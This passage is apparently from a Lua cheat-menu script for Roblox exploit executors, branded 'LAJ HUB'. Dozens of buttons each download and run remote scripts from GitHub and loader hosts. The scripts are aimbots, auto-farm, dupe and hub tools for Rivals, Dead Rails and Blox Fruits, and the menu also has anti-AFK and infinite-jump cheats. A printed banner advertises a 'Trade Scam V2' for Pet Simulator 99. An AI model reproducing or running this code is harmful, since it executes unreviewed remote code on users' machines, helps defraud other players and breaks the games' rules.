   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
       executednotify("Hydroxide")
   end,
})
Universal:CreateButton({
   Name = "SimpleSpy",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
       executednotify("SimpleSpy")
   end,
})
Universal:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
       executednotify("Airflow UPDATED")
   end,
})
Universal:CreateButton({
   Name = "Domain X",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
       executednotify("Domain X")
   end,
})
local idled_Connection
local function onIdled()
    if game then
        game:GetService("VirtualUser"):CaptureController()
        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
    end
end
Settings:CreateButton({
    Name = "Anti AFK",
    Callback = function()
        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
            executednotify("Anti AFK")
        end
    end,
})
local Inf_jump = false
local jumpConnection = nil
Settings:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Callback = function(Value)
      Inf_jump = Value
      
      -- Disconnect previous connection if it exists
      if jumpConnection then
          jumpConnection:Disconnect()
          jumpConnection = nil
      end
      
      -- Only create a new connection if Inf_jump is enabled and in game environment
      if Inf_jump and game then
          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
             if Inf_jump and game.Players.LocalPlayer.Character then
                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
             end
          end)
      end
   end,
})
local creditSection = MainTab:CreateSection("Credits")
MainTab:CreateLabel("Created by LAJ Hub Team")
MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
MainTab:CreateLabel("* Optimized for Swift Executor")
print("LAJ HUB - Swift Compatible Version")
print("All HTTP requests have been optimized for Swift executor")
print("This version includes:")
print("1. Full Swift compatibility")
print("2. Pet Sim 99 Tab with new Trade Scam V2")
print("3. All scripts updated to work with Swift")
print("4. Improved executor detection")
Rivals:CreateSection("Rivals Scripts")
Rivals:CreateButton({
   Name = "RIVALS Winter",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
        executednotify("RIVALS Winter")
   end,
})
Rivals:CreateButton({
   Name = "Azure Mod",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
        executednotify("Azure Mod")
   end,
})
Rivals:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
        executednotify("Tbao Hub")
   end,
})
Rivals:CreateButton({
   Name = "8Bits Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
        executednotify("8Bits Hub")
   end,
})
Rivals:CreateButton({
   Name = "Venox Hub",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
        executednotify("Venox Hub")
   end,
})
Rivals:CreateButton({
   Name = "Lunax Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
        executednotify("Lunax Hub")
   end,
})
Rivals:CreateButton({
   Name = "Ventures.lua",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
        executednotify("Ventures.lua")
   end,
})
Rivals:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
        executednotify("Ronix Hub")
   end,
})
Rivals:CreateButton({
   Name = "PinguinRVS",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
        executednotify("PinguinRVS")
   end,
})
Rivals:CreateButton({
   Name = "Zypherion",
   Callback = function()
        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
        executednotify("Zypherion")
   end,
})
Rivals:CreateButton({
   Name = "Auto Farm Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
        executednotify("Auto Farm Hub")
   end,
})
Rivals:CreateButton({
   Name = "Rybow Aimbot",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
        executednotify("Rybow Aimbot")
   end,
})
Rivals:CreateButton({
   Name = "Xera Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
        executednotify("Xera Script")
   end,
})
Rivals:CreateButton({
   Name = "Minimal Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
        executednotify("Minimal Hub")
   end,
})
DeadRails:CreateSection("Dead Rails Scripts")
DeadRails:CreateButton({
   Name = "Markk Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
       executednotify("Markk Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "Farx11122 Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
       executednotify("Farx11122 Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "SpiderXHub Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
       executednotify("SpiderXHub Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "Strelizia Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
       executednotify("Strelizia Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "Rinns Dead Rails No Key",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
       executednotify("Rinns Dead Rails No Key")
   end,
})
DeadRails:CreateButton({
   Name = "Auto Farm Bond",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
       executednotify("Auto Farm Bond")
   end,
})
DeadRails:CreateButton({
   Name = "Lomu Hub",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
       executednotify("Lomu Hub")
   end,
})
DeadRails:CreateButton({
   Name = "Neox Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
       executednotify("Neox Hub")
   end,
})
DeadRails:CreateButton({
   Name = "Sypher Hub OP",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
       executednotify("Sypher Hub OP")
   end,
})
DeadRails:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
       executednotify("Tbao Hub")
   end,
})
DeadRails:CreateButton({
   Name = "Karol Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
       executednotify("Karol Hub")
   end,
})
DeadRails:CreateButton({
   Name = "Dead Rails Alpha Script",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
       executednotify("Dead Rails Alpha Script")
   end,
})
DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
       executednotify("Airflow UPDATED")
   end,
})
DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
       executednotify("Airflow UPDATED")
   end,
})
BloxFruits:CreateSection("Blox Fruits Scripts")
BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "THUNDER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
        executednotify("THUNDER Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "Uranium Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
        executednotify("Uranium Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "Azure Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        executednotify("Azure Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "Vector Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
        executednotify("Vector Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "Payback Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
        executednotify("Payback Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "KAY Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
        executednotify("KAY Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
        executednotify("SEAGATE Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})
BloxFruits:CreateButton({
   Name = "MIN GREEN Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
        executednotify("MIN GREEN Hub")
   end,
})
